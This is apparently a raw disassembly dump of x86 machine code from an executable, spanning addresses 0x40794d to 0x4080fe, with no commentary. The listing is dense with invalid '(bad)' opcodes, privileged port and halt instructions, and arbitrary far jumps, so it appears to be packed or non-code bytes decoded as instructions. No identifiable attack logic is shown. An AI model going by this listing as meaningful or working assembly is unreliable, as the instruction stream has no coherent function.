  40794d:	inc    edx
  40794e:	and    al,0xed
  407950:	cmp    esi,DWORD PTR [edx-0x27]
  407953:	daa    
  407954:	cmp    al,0x57
  407956:	push   ebx
  407957:	mov    ecx,0x88dd6817
  40795c:	fldenv [edi]
  40795e:	xor    eax,0xd0f4acfe
  407963:	fst    DWORD PTR [ecx+0x4d6186e6]
  407969:	jge    0x407921
  40796b:	adc    al,0xf2
  40796d:	(bad)
  407971:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407972:	mov    ds:0x651e4031,al
  407977:	pop    ebx
  407978:	fwait
  407979:	add    eax,0xc0a0674
  40797e:	cmc    
  40797f:	cmp    BYTE PTR [eax+0x757525fd],al
  407985:	(bad)  
  407986:	mov    ch,0xe0
  407988:	mov    ebp,0x2b2b9e33
  40798d:	cli    
  40798e:	push   ss
  40798f:	retf   0x935f
  407992:	and    eax,0xe915b667
  407997:	add    eax,0xcef6f42b
  40799c:	pop    ss
  40799d:	cmc    
  40799e:	cdq    
  40799f:	int3   
  4079a0:	push   esp
  4079a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079a2:	mov    ebx,0xf349085d
  4079a7:	enter  0xfe16,0x9c
  4079ab:	jecxz  0x4079d1
  4079ad:	xchg   esp,eax
  4079ae:	sahf   
  4079af:	and    DWORD PTR [edi+0x1f],0x443054c8
  4079b6:	test   al,0xa4
  4079b8:	add    eax,0x8b3575ad
  4079bd:	mov    dh,0xee
  4079bf:	out    dx,eax
  4079c0:	cmp    dh,BYTE PTR [edi-0x4d37e316]
  4079c6:	cld    
  4079c7:	out    0x92,eax
  4079c9:	pop    ebp
  4079ca:	fcomp  st(5)
  4079cc:	clc    
  4079cd:	imul   ebp,DWORD PTR [eax-0x37],0xc46fb907
  4079d4:	and    ebp,0x483b6f3e
  4079da:	repnz dec eax
  4079dc:	ja     0x4079a1
  4079de:	sti    
  4079df:	jge    0x4079cc
  4079e1:	push   esp
  4079e2:	cmp    eax,0xfffdf8f
  4079e7:	sbb    eax,0x9fdfdeb1
  4079ec:	adc    al,0xab
  4079ee:	xchg   BYTE PTR [esi+0x3da41bd9],al
  4079f4:	xor    dh,BYTE PTR [eax+0x38]
  4079f7:	(bad)  
  4079f8:	pop    ss
  4079f9:	shl    esp,1
  4079fb:	lock dec esp
  4079fd:	(bad)  
  4079fe:	imul   esp,DWORD PTR [ebx+0x5c537f2f],0x72422a60
  407a08:	enter  0x103,0xf3
  407a0c:	inc    esp
  407a0d:	shl    BYTE PTR [eax],1
  407a0f:	mov    eax,0x5101162a
  407a14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a15:	cmp    BYTE PTR [ebx+0x5fb49aef],ah
  407a1b:	int3   
  407a1c:	rcl    BYTE PTR [ecx],cl
  407a1e:	jns    0x4079d5
  407a20:	jb     0x407a81
  407a22:	mov    ch,0x7a
  407a24:	imul   ebx,DWORD PTR [ebx+0x23105d1d],0xffffff87
  407a2b:	pop    ebp
  407a2c:	jns    0x407aa7
  407a2e:	mov    ah,0x1e
  407a30:	sahf   
  407a31:	cli    
  407a32:	add    BYTE PTR [edi-0xec9ab9d],ah
  407a38:	js     0x407a39
  407a3a:	mov    eax,0x72920fc0
  407a3f:	hlt    
  407a40:	or     dl,BYTE PTR [ecx]
  407a42:	pop    esp
  407a43:	push   eax
  407a44:	or     al,0x89
  407a46:	lds    esi,FWORD PTR [esp+ebx*8-0x5ce53e45]
  407a4d:	pop    edx
  407a4e:	ret    
  407a4f:	jbe    0x407a73
  407a51:	mov    bl,0x12
  407a53:	std    
  407a54:	mov    dh,0xbf
  407a56:	enter  0x9ddc,0x3
  407a5a:	outs   dx,DWORD PTR ds:[esi]
  407a5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a5c:	in     al,0x8f
  407a5e:	sub    al,0xff
  407a60:	dec    eax
  407a61:	and    DWORD PTR [ebx+0xf],0x70cc43fb
  407a68:	or     al,BYTE PTR [ebp+0x3e2f1c5b]
  407a6e:	stos   DWORD PTR es:[edi],eax
  407a6f:	nop
  407a70:	cmp    BYTE PTR [esi+0x1ae9d8ca],ah
  407a76:	hlt    
  407a77:	sbb    al,0x1a
  407a79:	or     BYTE PTR [esi],bl
  407a7b:	push   0xffffffa2
  407a7d:	test   esp,0xe034904b
  407a83:	xchg   esp,eax
  407a84:	ss pop ss
  407a86:	int3   
  407a87:	outs   dx,DWORD PTR ds:[esi]
  407a88:	sbb    DWORD PTR [esi-0x17f3b4c9],0x28
  407a8f:	push   edi
  407a90:	sahf   
  407a91:	xor    al,cl
  407a93:	inc    ecx
  407a94:	lods   eax,DWORD PTR ds:[esi]
  407a95:	add    esp,DWORD PTR [edi]
  407a97:	pop    es
  407a98:	mov    ebp,0xacd65ea3
  407a9d:	mov    ebp,0x6bf99ee8
  407aa2:	dec    esi
  407aa3:	fistp  WORD PTR [edx]
  407aa5:	push   ds
  407aa6:	cdq    
  407aa7:	add    al,al
  407aa9:	pop    esp
  407aaa:	dec    ecx
  407aab:	sahf   
  407aac:	sbb    al,0x73
  407aae:	mov    ds:0x7a3a99eb,al
  407ab3:	into   
  407ab4:	sub    al,0x55
  407ab6:	cmp    bl,bl
  407ab8:	clc    
  407ab9:	aad    0xec
  407abb:	and    eax,0xf65b4011
  407ac0:	pop    ss
  407ac1:	push   0xf184b55f
  407ac6:	xchg   DWORD PTR [edi+0x19],esi
  407ac9:	jns    0x407b15
  407acb:	mov    ebp,0x6fb34be0
  407ad0:	cmp    ecx,esp
  407ad2:	int3   
  407ad3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ad4:	iret   
  407ad5:	or     edx,DWORD PTR [edx]
  407ad7:	and    bl,BYTE PTR [esi-0x721e4efb]
  407add:	sar    esp,1
  407adf:	or     BYTE PTR [esi],0xbf
  407ae2:	mov    ds:0x817523e,eax
  407ae7:	add    al,dl
  407ae9:	fld    QWORD PTR ds:[esi]
  407aec:	jl     0x407b41
  407aee:	fcom   QWORD PTR [edi-0x5ee0b197]
  407af4:	scas   eax,DWORD PTR es:[edi]
  407af5:	stos   DWORD PTR es:[edi],eax
  407af6:	into   
  407af7:	xor    ecx,DWORD PTR ds:[edx+edx*8]
  407afb:	sahf   
  407afc:	pop    es
  407afd:	jl     0x407b41
  407aff:	ror    BYTE PTR [eax+0x261bfe16],1
  407b05:	jb     0x407aac
  407b07:	push   esp
  407b08:	call   0xb94:0x107ec00a
  407b0f:	adc    eax,0x3598d179
  407b14:	jbe    0x407b61
  407b16:	mov    fs,esp
  407b18:	pusha  
  407b19:	sbb    eax,0xe484b0f1
  407b1e:	jmp    0x3457cbce
  407b23:	mov    esi,0xc376101e
  407b28:	push   ecx
  407b29:	push   ds
  407b2a:	outs   dx,DWORD PTR ds:[esi]
  407b2b:	retf   0xcef
  407b2e:	cmp    al,ch
  407b30:	(bad)  
  407b31:	in     eax,0xda
  407b33:	xchg   edi,eax
  407b34:	xor    al,0x69
  407b36:	adc    DWORD PTR [edi-0x11],ebx
  407b39:	adc    al,BYTE PTR [esi]
  407b3b:	mov    edx,0x94778829
  407b40:	loopne 0x407b91
  407b42:	(bad)  
  407b43:	jmp    0x407ba4
  407b45:	push   edi
  407b46:	test   BYTE PTR [ebp+0x4c5a0660],dl
  407b4c:	jns    0x407bac
  407b4e:	repnz call 0x31da:0xede3eb47
  407b56:	jnp    0x407b96
  407b58:	cmp    BYTE PTR [eax+0x51456fba],0xa6
  407b5f:	in     eax,0xc6
  407b61:	mov    esp,0xfb967b03
  407b66:	rcr    BYTE PTR [eax-0x3c],cl
  407b69:	inc    ecx
  407b6a:	imul   ecx,DWORD PTR [ebx+0x42],0x23
  407b6e:	dec    edx
  407b6f:	test   DWORD PTR [edi],ebx
  407b71:	pop    edi
  407b72:	fld    DWORD PTR [edi-0x4b37b944]
  407b78:	addr16 xchg ebp,eax
  407b7a:	hlt    
  407b7b:	sbb    al,0x8b
  407b7d:	sbb    ebx,ebp
  407b7f:	adc    BYTE PTR [eax+0x5680bf2b],bh
  407b85:	mov    bh,0xf8
  407b87:	cmp    DWORD PTR [esi],ebp
  407b89:	test   al,0xdd
  407b8b:	adc    BYTE PTR [edx-0xf],ah
  407b8e:	xor    ecx,DWORD PTR [esi-0x76]
  407b91:	fild   WORD PTR [eax-0x3b]
  407b94:	mov    BYTE PTR [esi+0x1ee8f811],dl
  407b9a:	imul   edx,DWORD PTR [esi],0xa9e50515
  407ba0:	inc    ecx
  407ba1:	push   edx
  407ba2:	mov    edx,esp
  407ba4:	add    DWORD PTR [ecx],edx
  407ba6:	xchg   DWORD PTR [edx-0x4e],eax
  407ba9:	and    DWORD PTR [ebx],edx
  407bab:	aam    0x81
  407bad:	cmp    eax,0x39b57583
  407bb2:	xor    eax,0x19c4645d
  407bb7:	jne    0x407c33
  407bb9:	inc    esi
  407bba:	mov    bh,0x19
  407bbc:	sub    BYTE PTR [edx+0x24],ch
  407bbf:	sub    BYTE PTR [edx+0x4e9c0bbe],cl
  407bc5:	mov    esi,0xe42c0720
  407bca:	pop    es
  407bcb:	inc    esp
  407bcc:	pop    ss
  407bcd:	pop    ebp
  407bce:	cmp    esi,DWORD PTR [ebx]
  407bd0:	adc    ebx,DWORD PTR [edi+ebx*4-0x4e]
  407bd4:	push   eax
  407bd5:	inc    ecx
  407bd6:	sub    BYTE PTR [ebp+0x27],0xf
  407bda:	popf   
  407bdb:	enter  0x9542,0x8a
  407bdf:	cmp    edx,eax
  407be1:	xor    BYTE PTR [edx],ah
  407be3:	mov    ss,WORD PTR [ebx-0x7a]
  407be6:	xor    edi,edx
  407be8:	fistp  WORD PTR [ebp-0x41453af]
  407bee:	out    0x24,al
  407bf0:	popa   
  407bf1:	jp     0x407c04
  407bf3:	cwde   
  407bf4:	lea    edi,[ecx+0x27]
  407bf7:	fcmovb st,st(6)
  407bf9:	adc    edx,DWORD PTR [esi]
  407bfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bfc:	mov    ebx,fs
  407bfe:	addr16 push ebx
  407c00:	icebp  
  407c01:	lock dec esi
  407c03:	xchg   ecx,eax
  407c04:	fcom   QWORD PTR [ebp+0x63]
  407c07:	stc    
  407c08:	fcmovnbe st,st(4)
  407c0a:	sbb    eax,0xfe4c393b
  407c0f:	(bad)  
  407c10:	in     eax,0x90
  407c12:	ss (bad) 
  407c14:	jae    0x407c40
  407c16:	mov    cl,0x98
  407c18:	fisttp WORD PTR [ecx-0x46896e88]
  407c1e:	xor    al,0xe5
  407c20:	pop    esi
  407c21:	in     al,0x4d
  407c23:	or     DWORD PTR [ecx+edx*8+0x76],ebx
  407c27:	inc    ebp
  407c28:	aad    0x51
  407c2a:	lods   eax,DWORD PTR ds:[esi]
  407c2b:	retf   
  407c2c:	stos   BYTE PTR es:[edi],al
  407c2d:	mov    esi,0x1442129b
  407c32:	out    dx,al
  407c33:	dec    eax
  407c34:	mov    ah,0x91
  407c36:	pop    eax
  407c37:	imul   ebx,DWORD PTR [ebp+0x1a8fe690],0x2e
  407c3e:	mov    ch,0x8f
  407c40:	push   ecx
  407c41:	cmp    ebx,DWORD PTR [eax-0x668058d4]
  407c47:	ret    
  407c48:	stc    
  407c49:	hlt    
  407c4a:	mov    ds:0xc577a5dc,eax
  407c4f:	mov    ch,0x29
  407c51:	inc    esi
  407c52:	sbb    DWORD PTR [ecx-0x7942e5a9],eax
  407c58:	enter  0x4883,0xeb
  407c5c:	shl    dl,0x31
  407c5f:	and    eax,0x43243a
  407c64:	in     eax,dx
  407c65:	xchg   ebx,eax
  407c66:	mov    al,ds:0xc5603ce1
  407c6b:	push   ecx
  407c6c:	adc    ah,cl
  407c6e:	outs   dx,BYTE PTR ds:[esi]
  407c6f:	nop
  407c70:	inc    ebp
  407c71:	xor    eax,0xd8f97abb
  407c76:	push   edx
  407c77:	cli    
  407c78:	aas    
  407c79:	ja     0x407c74
  407c7b:	jmp    FWORD PTR [edi+0x4]
  407c7e:	sahf   
  407c7f:	add    eax,0x897d2810
  407c84:	fcomp  st(1)
  407c86:	dec    ebx
  407c87:	sub    al,0xb1
  407c89:	xchg   ecx,eax
  407c8a:	inc    ebx
  407c8b:	cld    
  407c8c:	xchg   esi,eax
  407c8d:	xor    DWORD PTR ds:0xbc880bda,ebp
  407c93:	mov    ah,dl
  407c95:	push   edi
  407c96:	ret    
  407c97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c98:	fisub  DWORD PTR [esi+0x4bfb82e8]
  407c9e:	adc    eax,0x55f1022
  407ca3:	cmp    bh,BYTE PTR [edi-0x5f]
  407ca6:	dec    esp
  407ca7:	cmp    al,0x9e
  407ca9:	sub    BYTE PTR ds:0x1c0f7b18,bl
  407caf:	xchg   DWORD PTR [esi-0x2f9ff0fe],ecx
  407cb5:	daa    
  407cb6:	cmp    al,0xb2
  407cb8:	add    ch,BYTE PTR ds:0xa0ef507b
  407cbe:	fwait
  407cbf:	mov    esi,0xa7331485
  407cc4:	lods   eax,DWORD PTR ds:[esi]
  407cc5:	sub    DWORD PTR [eax],0xfffffff2
  407cc8:	ins    DWORD PTR es:[edi],dx
  407cc9:	loopne 0x407d29
  407ccb:	paddq  mm2,QWORD PTR [ebp+0x71604036]
  407cd2:	add    edi,DWORD PTR [edi+esi*1+0x6bca2e0f]
  407cd9:	jo     0x407d0d
  407cdb:	sar    BYTE PTR [edx+eiz*8],0x14
  407cdf:	cmp    esi,edx
  407ce1:	iret   
  407ce2:	mov    BYTE PTR [edx+0x4a],bh
  407ce5:	mov    edx,ss
  407ce7:	pushf  
  407ce8:	sahf   
  407ce9:	addr16 jb 0x407d24
  407cec:	jl     0x407ca7
  407cee:	add    esp,edi
  407cf0:	push   0x72
  407cf2:	add    DWORD PTR [ebx-0x12af54e2],ebx
  407cf8:	xor    DWORD PTR [ecx+esi*4-0x77126f3b],0x43
  407d00:	test   DWORD PTR [edi-0x6],ebp
  407d03:	mov    bl,0x22
  407d05:	jnp    0x407d2d
  407d07:	inc    eax
  407d08:	pop    es
  407d09:	lds    edi,FWORD PTR [ecx-0x3197e1d2]
  407d0f:	cli    
  407d10:	add    al,0xa7
  407d12:	xchg   esp,eax
  407d13:	jle    0x407ca2
  407d15:	inc    esi
  407d16:	inc    edi
  407d17:	in     al,0x72
  407d19:	push   es
  407d1a:	mov    dh,0xf0
  407d1c:	cs ins BYTE PTR es:[edi],dx
  407d1e:	mov    edi,0x62086971
  407d23:	addr16 mov cl,0x98
  407d26:	or     ecx,ebx
  407d28:	jmp    0xed8d:0xecdd79bc
  407d2f:	or     ecx,esi
  407d31:	icebp  
  407d32:	(bad)  
  407d33:	stc    
  407d34:	mov    ebx,0x70f244d2
  407d39:	in     al,0x6e
  407d3b:	mov    al,ds:0x33bda
  407d40:	push   esi
  407d41:	frstor [ebx+0x57]
  407d44:	(bad)  
  407d45:	mov    al,ds:0x40ccb730
  407d4a:	mov    edx,0xbfb309c9
  407d4f:	adc    ch,dl
  407d51:	pop    esp
  407d52:	mov    ds:0x23e72e61,al
  407d57:	aaa    
  407d58:	fwait
  407d59:	mov    ds:0x2f22543c,eax
  407d5e:	pop    ecx
  407d5f:	fst    DWORD PTR [esi-0x47]
  407d62:	inc    edx
  407d63:	inc    esi
  407d64:	je     0x407daf
  407d66:	pop    ecx
  407d67:	inc    edi
  407d68:	xchg   DWORD PTR [eax],ebx
  407d6a:	xchg   esp,eax
  407d6b:	push   eax
  407d6c:	mov    ebp,0x81906fc7
  407d71:	iret   
  407d72:	loope  0x407de8
  407d74:	(bad)  
  407d75:	scas   eax,DWORD PTR es:[edi]
  407d76:	pop    eax
  407d77:	pushf  
  407d78:	retf   0x960d
  407d7b:	mov    dh,bl
  407d7d:	shl    BYTE PTR [ecx-0x20],cl
  407d80:	mov    bl,0xad
  407d82:	pop    edi
  407d83:	or     BYTE PTR [eax-0x2b593b66],bl
  407d89:	pop    es
  407d8a:	into   
  407d8b:	(bad)  
  407d8c:	(bad)  
  407d8d:	dec    ebp
  407d8e:	loopne 0x407e07
  407d90:	lahf   
  407d91:	clc    
  407d92:	lds    eax,FWORD PTR [ebx+edx*1]
  407d95:	iret   
  407d96:	lods   eax,DWORD PTR ds:[esi]
  407d97:	scas   eax,DWORD PTR es:[edi]
  407d98:	jno    0x407dc2
  407d9a:	adc    DWORD PTR [eax],edx
  407d9c:	xor    al,BYTE PTR [edx+0x32ed7e78]
  407da2:	and    BYTE PTR [ebp+0xcadf442],cl
  407da8:	in     al,0xbd
  407daa:	mov    bl,0x5f
  407dac:	mov    ecx,0x3f879420
  407db1:	mov    bl,0xe3
  407db3:	imul   esi,DWORD PTR [ecx+ecx*2],0xffffffb1
  407db7:	push   cs
  407db8:	fadd   DWORD PTR [esi+eax*8-0x37]
  407dbc:	push   ecx
  407dbd:	or     edx,edx
  407dbf:	push   0xe19ec033
  407dc4:	xchg   esi,eax
  407dc5:	fbstp  TBYTE PTR [edx]
  407dc7:	adc    BYTE PTR [ecx],ah
  407dc9:	pop    esp
  407dca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dcb:	out    dx,al
  407dcc:	pop    ebp
  407dcd:	dec    eax
  407dce:	xlat   BYTE PTR ds:[ebx]
  407dcf:	add    cl,BYTE PTR gs:[ecx*2+0x7ba2ddb7]
  407dd7:	lahf   
  407dd8:	test   DWORD PTR [eax-0x7d02d830],edx
  407dde:	push   ecx
  407ddf:	inc    ebp
  407de0:	ret    
  407de1:	shr    BYTE PTR [esi],cl
  407de3:	mov    cl,0x1f
  407de5:	xchg   ebx,edx
  407de7:	and    cl,BYTE PTR [edx]
  407de9:	(bad)  
  407dea:	std    
  407deb:	fisttp DWORD PTR [esi+0x46]
  407dee:	scas   al,BYTE PTR es:[edi]
  407def:	cmp    cl,ch
  407df1:	inc    ebx
  407df2:	dec    esi
  407df3:	ins    DWORD PTR es:[edi],dx
  407df4:	(bad)  
  407df5:	xor    eax,0xbb17602a
  407dfa:	fimul  WORD PTR [ebx]
  407dfc:	and    BYTE PTR [ebx+eiz*1+0x75],bl
  407e00:	out    dx,eax
  407e01:	xchg   edi,eax
  407e02:	imul   eax,DWORD PTR [edx-0x6553b864],0x3f
  407e09:	pop    ebp
  407e0a:	push   edx
  407e0b:	fs mov edx,0xe784db0b
  407e11:	xor    ebx,esi
  407e13:	dec    ebx
  407e14:	jmp    0x407e19
  407e16:	dec    esp
  407e17:	aas    
  407e18:	scas   eax,DWORD PTR es:[edi]
  407e19:	fcomp  QWORD PTR [edx]
  407e1b:	ror    al,1
  407e1d:	pushf  
  407e1e:	outs   dx,DWORD PTR gs:[esi]
  407e20:	mov    dl,0x64
  407e22:	mov    ebx,0xa6a8581a
  407e27:	push   ebp
  407e28:	push   ds
  407e29:	stos   BYTE PTR es:[edi],al
  407e2a:	cmp    BYTE PTR [ecx],dl
  407e2c:	repnz test BYTE PTR gs:[edi-0xf3d5c46],bh
  407e34:	mov    edi,0xee5940d4
  407e39:	mov    ebp,0x9c416356
  407e3e:	sub    bh,BYTE PTR [esi-0x1d8b3e94]
  407e44:	ret    
  407e45:	add    ecx,eax
  407e47:	add    eax,0x44a52750
  407e4c:	pushf  
  407e4d:	sbb    BYTE PTR [eax-0x50],dh
  407e50:	jge    0x407e51
  407e52:	leave  
  407e53:	or     DWORD PTR [ebx-0x20],ecx
  407e56:	pop    ecx
  407e57:	(bad)  
  407e58:	adc    dl,BYTE PTR [edx]
  407e5a:	out    0x6a,al
  407e5c:	jmp    0x8516:0xd69478a1
  407e63:	popf   
  407e64:	cmp    ebp,DWORD PTR [ecx]
  407e66:	inc    ecx
  407e67:	jae    0x407e10
  407e69:	sub    bl,BYTE PTR [edx]
  407e6b:	imul   ebx,DWORD PTR [ebx+0x6e],0x72414bd2
  407e72:	rcr    BYTE PTR [edi*2+0xbe18cdf],cl
  407e79:	out    0xfa,al
  407e7b:	inc    esp
  407e7c:	cmp    BYTE PTR [esi],ch
  407e7e:	in     eax,0xa2
  407e80:	pop    ds
  407e81:	in     eax,0xb2
  407e83:	iret   
  407e84:	in     eax,dx
  407e85:	(bad)  
  407e86:	xor    ebx,DWORD PTR [eax+0x24]
  407e89:	mov    dl,0xfa
  407e8b:	inc    ebp
  407e8c:	cmp    dh,BYTE PTR [ecx+edi*4+0xd93dbbe]
  407e93:	cs push es
  407e95:	cmp    al,0x80
  407e97:	dec    ecx
  407e98:	mov    cl,dh
  407e9a:	(bad)  
  407e9b:	sub    ecx,DWORD PTR [ecx-0x4701040]
  407ea1:	xor    BYTE PTR [ebx-0x3c7d737],0x7e
  407ea8:	jne    0x407e9b
  407eaa:	test   BYTE PTR [edi+0x21],dh
  407ead:	cmp    ebx,DWORD PTR [edx]
  407eaf:	loope  0x407e73
  407eb1:	mov    ah,dh
  407eb3:	dec    ecx
  407eb4:	adc    esi,0x9e3d2bde
  407eba:	push   edx
  407ebb:	test   edi,ebx
  407ebd:	stos   BYTE PTR es:[edi],al
  407ebe:	sub    edi,edi
  407ec0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ec1:	arpl   WORD PTR [edx-0x5c],cx
  407ec4:	pushf  
  407ec5:	push   es
  407ec6:	out    dx,eax
  407ec7:	fwait
  407ec8:	clc    
  407ec9:	mov    eax,0x23d93099
  407ece:	xchg   ebp,eax
  407ecf:	fistp  WORD PTR [ebp+0xc]
  407ed2:	out    0xf3,al
  407ed4:	ror    DWORD PTR [esi+0x71],cl
  407ed7:	out    0xcf,eax
  407ed9:	push   esp
  407eda:	(bad)
  407edd:	push   edi
  407ede:	jge    0x407f18
  407ee0:	or     al,bh
  407ee2:	icebp  
  407ee3:	mov    ds,WORD PTR [edx+edi*2-0x27fcc196]
  407eea:	daa    
  407eeb:	stc    
  407eec:	push   ecx
  407eed:	add    BYTE PTR [ecx],dh
  407eef:	sbb    edi,DWORD PTR [esi]
  407ef1:	add    edx,esi
  407ef3:	iret   
  407ef4:	push   edi
  407ef5:	in     eax,0xc0
  407ef7:	clc    
  407ef8:	lds    ebx,FWORD PTR [esi-0x676536f6]
  407efe:	idiv   bl
  407f00:	cli    
  407f01:	test   al,0xa3
  407f03:	test   BYTE PTR [esi],bh
  407f05:	lock push esi
  407f07:	stos   BYTE PTR es:[edi],al
  407f08:	enter  0x6223,0xa8
  407f0c:	in     al,dx
  407f0d:	add    DWORD PTR [edx-0x43],esp
  407f10:	or     eax,0x934db659
  407f15:	lahf   
  407f16:	xor    eax,0x2bb63c37
  407f1b:	icebp  
  407f1c:	dec    esi
  407f1d:	cmp    al,BYTE PTR [ebx+0x43]
  407f20:	pop    es
  407f21:	push   esp
  407f22:	imul   ecx,DWORD PTR [ecx+edx*2+0x9c1eed2],0xffffffde
  407f2a:	loopne 0x407f5d
  407f2c:	out    0x1a,eax
  407f2e:	cwde   
  407f2f:	xchg   ebx,eax
  407f30:	or     DWORD PTR [edi+0x4],edx
  407f33:	fdivr  st(4),st
  407f35:	(bad)  
  407f36:	int3   
  407f37:	ins    BYTE PTR es:[edi],dx
  407f38:	jno    0x407f1e
  407f3a:	add    esi,0x2
  407f3d:	dec    ebx
  407f3e:	dec    ebx
  407f3f:	push   edi
  407f40:	and    al,0xd1
  407f42:	push   cs
  407f43:	ds mov ah,0x51
  407f46:	out    0x8,al
  407f48:	test   DWORD PTR [ecx],0x994d41d5
  407f4e:	adc    eax,ebp
  407f50:	add    esi,0xecf4cb3d
  407f56:	push   ebx
  407f57:	jb     0x407f3c
  407f59:	sbb    cl,BYTE PTR [edx]
  407f5b:	pushf  
  407f5c:	inc    edx
  407f5d:	sti    
  407f5e:	or     bh,BYTE PTR [edi]
  407f60:	outs   dx,DWORD PTR ds:[esi]
  407f61:	and    ebp,esp
  407f63:	add    esp,edx
  407f65:	mov    cl,0x85
  407f67:	or     bl,0x3c
  407f6a:	jmp    0x407eed
  407f6c:	cmp    eax,0xe6bef8be
  407f71:	ins    DWORD PTR es:[edi],dx
  407f72:	jbe    0x407fe0
  407f74:	xor    BYTE PTR [eax],cl
  407f76:	cdq    
  407f77:	inc    eax
  407f79:	jg     0x407f69
  407f7b:	mov    edi,DWORD PTR ds:0xc4af0516
  407f81:	adc    dh,BYTE PTR [ebp-0x42c143c1]
  407f87:	add    al,0x11
  407f89:	sar    BYTE PTR [ebp+edx*1-0x58],1
  407f8d:	mov    ds:0x4bb1b44e,al
  407f92:	adc    edi,DWORD PTR [ebx]
  407f94:	and    al,0xdf
  407f96:	daa    
  407f97:	(bad)  
  407f98:	sbb    ebp,DWORD PTR [eax+0x7ab35766]
  407f9e:	lahf   
  407f9f:	cld    
  407fa0:	cmp    dh,BYTE PTR [esp+edi*4]
  407fa3:	sub    DWORD PTR [edi+edi*1],0xaee93593
  407faa:	mov    ebx,0x8a22ae0f
  407faf:	inc    edi
  407fb0:	mov    edx,0x1828bc52
  407fb5:	int3   
  407fb6:	push   ss
  407fb7:	in     eax,dx
  407fb8:	fwait
  407fb9:	cwde   
  407fba:	inc    BYTE PTR [edx-0x1f]
  407fbd:	loope  0x407fb7
  407fbf:	inc    edi
  407fc0:	xor    al,0x5b
  407fc2:	mov    bh,0x15
  407fc4:	xor    bh,BYTE PTR [ebx-0x4]
  407fc7:	adc    eax,0xd8bd16f
  407fcc:	xchg   esp,eax
  407fcd:	sbb    eax,0x1877b61b
  407fd2:	xchg   ah,dh
  407fd4:	mov    ch,0x37
  407fd6:	lods   al,BYTE PTR ds:[esi]
  407fd7:	outs   dx,BYTE PTR ds:[esi]
  407fd8:	push   esi
  407fd9:	aam    0xce
  407fdb:	fistp  WORD PTR [ecx]
  407fdd:	sub    DWORD PTR [edi-0x238c0267],0xffffff91
  407fe4:	lea    esi,[ebp+0x1af59f73]
  407fea:	nop
  407feb:	inc    ebp
  407fec:	enter  0x41c,0x5d
  407ff0:	sub    eax,0x322ce303
  407ff5:	lods   al,BYTE PTR ds:[esi]
  407ff6:	test   bl,cl
  407ff8:	mov    ds:0x74002a42,al
  407ffd:	dec    ebp
  407ffe:	aaa    
  407fff:	push   esi
  408000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408001:	(bad)  
  408002:	adc    eax,0x945ea662
  408007:	cmp    al,0x99
  408009:	add    dl,bl
  40800b:	mov    edx,0x274f825f
  408010:	int    0xc4
  408012:	pop    ebp
  408013:	sub    ch,BYTE PTR [ebx+0x4b]
  408016:	(bad)  
  408017:	push   0xffffffa3
  408019:	lahf   
  40801a:	test   DWORD PTR [ebp+0x11f65490],edi
  408020:	clc    
  408021:	mov    gs,WORD PTR [ebp+0x1cc0696]
  408027:	xor    eax,0xd20e0d87
  40802c:	jno    0x407ff3
  40802e:	cmp    ebp,DWORD PTR [ecx+edi*1]
  408031:	inc    ecx
  408032:	bound  ebx,QWORD PTR [esi-0x22687165]
  408038:	into   
  408039:	fwait
  40803a:	or     al,0xba
  40803c:	sbb    BYTE PTR [edi],bl
  40803e:	push   edi
  40803f:	jmp    0x4080ae
  408041:	cmp    al,0x8f
  408043:	pop    DWORD PTR [edi+0x70]
  408046:	and    esi,ebx
  408048:	sahf   
  408049:	popf   
  40804a:	outs   dx,BYTE PTR ds:[esi]
  40804b:	pop    ecx
  40804c:	adc    BYTE PTR [ebx],al
  40804e:	jg     0x408054
  408050:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408051:	mov    ds:0xdd8c1c2a,eax
  408056:	mov    dl,0x64
  408058:	or     esp,0xffffffbf
  40805b:	add    DWORD PTR [edi],edx
  40805d:	addr16 mov ah,0xbb
  408060:	fisub  WORD PTR [eax-0x64ef4ab2]
  408066:	adc    DWORD PTR [ecx-0x74],0xffffffaf
  40806a:	mov    ds:0x8e210581,eax
  40806f:	mov    bh,0xb6
  408071:	jne    0x4080ea
  408073:	inc    eax
  408074:	ficom  WORD PTR [ebx-0x36]
  408077:	test   BYTE PTR [ebx-0x9],0x62
  40807b:	mov    esi,0x6ba54370
  408080:	ins    DWORD PTR es:[edi],dx
  408081:	or     ch,BYTE PTR [ebp-0x68149fa4]
  408087:	fisub  WORD PTR [edi+0x33]
  40808a:	dec    edi
  40808b:	push   ebp
  40808c:	push   0x8fd91165
  408091:	sbb    eax,0x51ede011
  408096:	mov    esp,0xe0376dd1
  40809b:	sub    ebx,edx
  40809d:	xchg   ebp,eax
  40809e:	add    al,0x82
  4080a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080a1:	dec    ebx
  4080a2:	outs   dx,DWORD PTR ds:[esi]
  4080a3:	dec    esp
  4080a4:	jle    0x4080ea
  4080a6:	sbb    DWORD PTR [edi-0x5ce55b03],esp
  4080ac:	dec    edi
  4080ad:	loop   0x40808c
  4080af:	in     eax,0x63
  4080b1:	mov    ds:0x4556f8a5,al
  4080b6:	jecxz  0x408113
  4080b8:	jp     0x408132
  4080ba:	call   0xdbd00fa1
  4080bf:	data16 into 
  4080c1:	sbb    eax,0x536edbdf
  4080c6:	or     eax,0x6b1050b5
  4080cb:	inc    ebp
  4080cc:	data16 aaa 
  4080ce:	mov    ebp,0xb3e78396
  4080d3:	lock xchg BYTE PTR [edi],ch
  4080d6:	push   cs
  4080d7:	enter  0x64ac,0xda
  4080db:	or     dh,0xac
  4080de:	adc    BYTE PTR [edi-0x61],bh
  4080e1:	push   ebp
  4080e2:	maskmovq mm4,(bad)
  4080e3:	mul    DWORD PTR [eax-0x5bbc0492]
  4080e9:	cmp    DWORD PTR [edi+0x4e3a32b8],ebx
  4080ef:	pop    es
  4080f0:	ja     0x4080ba
  4080f2:	mov    ecx,0xc10d8309
  4080f7:	pop    ebx
  4080f8:	mov    ds:0x50636078,al
  4080fd:	inc    esi
  4080fe:	mov    bh,BYTE PTR [ecx+0x13]
